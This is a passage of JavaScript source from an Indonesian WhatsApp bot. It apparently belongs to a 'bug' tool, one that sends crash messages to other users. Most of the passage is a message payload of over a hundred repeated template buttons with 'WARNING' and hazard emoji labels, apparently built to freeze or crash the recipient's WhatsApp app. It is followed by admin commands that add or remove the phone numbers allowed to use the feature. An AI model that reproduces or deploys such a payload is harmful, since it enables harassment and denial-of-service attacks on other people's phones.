{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! ??💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displDiayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quoted: lep }
]})
}}
break
case "runtime":{
reply(`Status Online:\n${runtime(process.uptime())}`)
}
break
case "bot":{
reply(`Bot Aktif >_<`)
}
break
case 'delusr':{
if (!isGroup) return reply(`wajib dalam grup`)
if (!islinson && !isGroupAdmins) return reply(`Fitur khusus admin`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await nabil.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
unp = bugchat.indexOf(ya)
bugchat.splice(unp, 1)
fs.writeFileSync('./nodeJS/database/akses.json', JSON.stringify(bugchat))
delusr = ya+`@s.whatsapp.net`
mentions(`sukses delete user @${delusr.split('@')[0]}`, [delusr])
}
break
case 'addusr':{
if (!isGroup) return reply(`wajib dalam grup`)
if (!islinson && !isGroupAdmins) return reply(`Fitur khusus admin`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
yo = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await nabil.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
bugchat.push(yo)
fs.writeFileSync('./nodeJS/database/akses.json', JSON.stringify(bugchat))
addusr = yo+`@s.whatsapp.net`
mentions(`sukses add user @${addusr.split('@')[0]}`, [addusr])
}
break
default:
}
} catch (err) {
nabil.sendMessage(global.sendNotif+'@s.whatsapp.net', {text:`${util.format(err)}`})
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})